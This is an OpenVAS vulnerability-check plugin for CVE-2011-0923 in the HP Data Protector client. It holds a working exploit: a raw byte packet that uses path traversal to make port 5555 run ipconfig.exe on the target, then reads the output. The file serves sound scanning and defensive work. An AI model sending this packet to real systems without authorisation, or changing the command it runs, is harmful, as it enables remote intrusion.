###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_hp_data_protector_exec_cmd_code_exec_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# HP Data Protector Client 'EXEC_CMD' Remote Code Execution Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary
  Perl code via a crafted command.
  Impact Level: Application.";
tag_affected = "HP Data Protector 6.11 and prior.";
tag_insight = "The specific flaw exists within the filtering of arguments to the 'EXEC_CMD'
  command. which allows remote connections to execute files within it's local
  bin directory.";
tag_solution = "No solution or patch is available as of 07th June, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to
  http://h71028.www7.hp.com/enterprise/w1/en/software/information-management-data-protector.html";
tag_summary = "This host is installed with HP Data Protector and is prone to
  remote code execution vulnerability.";

if(description)
{
  script_id(801946);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-06-13 15:28:04 +0200 (Mon, 13 Jun 2011)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_cve_id("CVE-2011-0923");
  script_bugtraq_id(46234);
  script_name("HP Data Protector Client 'EXEC_CMD' Remote Code Execution Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.zerodayinitiative.com/advisories/ZDI-11-055/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/101766/hpdp-exec.txt");
  script_xref(name : "URL" , value : "http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02781143");

  script_description(desc);
  script_summary("Check the remote code execution vulnerability in HP Data Protector");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("General");
  script_require_ports(5555);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


## HP Data Protector default port
port = 5555;

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

##  Open tcp socket
soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

# Data Protector can take some time to return its header
response = recv(socket:soc, length:4096, timeout:20);

## Confirm the application
if("HP Data Protector" >!< response){
  exit(0);
}

close(soc);

## reopen the socket
soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

##  Construct attack string (ipconfig)
req = raw_string(0x00, 0x00, 0x00, 0xa4, 0x20, 0x32, 0x00, 0x20,
                 0x66, 0x64, 0x69, 0x73, 0x6b, 0x79, 0x6f, 0x75,
                 0x00, 0x20, 0x30, 0x00, 0x20, 0x53, 0x59, 0x53,
                 0x54, 0x45, 0x4d, 0x00, 0x20, 0x66, 0x64, 0x69,
                 0x73, 0x6b, 0x79, 0x6f, 0x75, 0x00, 0x20, 0x43,
                 0x00, 0x20, 0x32, 0x30, 0x00, 0x20, 0x66, 0x64,
                 0x69, 0x73, 0x6b, 0x79, 0x6f, 0x75, 0x00, 0x20,
                 0x50, 0x6f, 0x63, 0x00, 0x20, 0x4e, 0x54, 0x41,
                 0x55, 0x54, 0x48, 0x4f, 0x52, 0x49, 0x54, 0x59,
                 0x00, 0x20, 0x4e, 0x54, 0x41, 0x55, 0x54, 0x48,
                 0x4f, 0x52, 0x49, 0x54, 0x59, 0x00, 0x20, 0x4e,
                 0x54, 0x41, 0x55, 0x54, 0x48, 0x4f, 0x52, 0x49,
                 0x54, 0x59, 0x00, 0x20, 0x30, 0x00, 0x20, 0x30,
                 0x00, 0x20, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f,
                 0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e,
                 0x2f, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2e,
                 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f,
                 0x5c, 0x77, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73,
                 0x5c, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x33,
                 0x32, 0x5c, 0x69, 0x70, 0x63, 0x6f, 0x6e, 0x66,
                 0x69, 0x67, 0x2e, 0x65, 0x78, 0x65, 0x00, 0x00);

## send the data
send(socket:soc, data:req);

## wait for 5 sec
sleep(5);

## Receive the data
res = recv(socket:soc, length:4096);

## Get the response length
len = strlen(res);
if(!len){
  exit(0);
}

data = "";

## Iterate response by each characters
for (i = 0; i < len; i = i + 1)
{
  ## Get only Characters from response
  if((ord(res[i]) >= 61 )){
    data =data + res[i];
  }
}

## Confirm the exploit
if("WindowsIPConfiguration" >< data && "EthernetadapterLocalAreaConnection" >< data){
  security_hole(port);
}

close(soc);
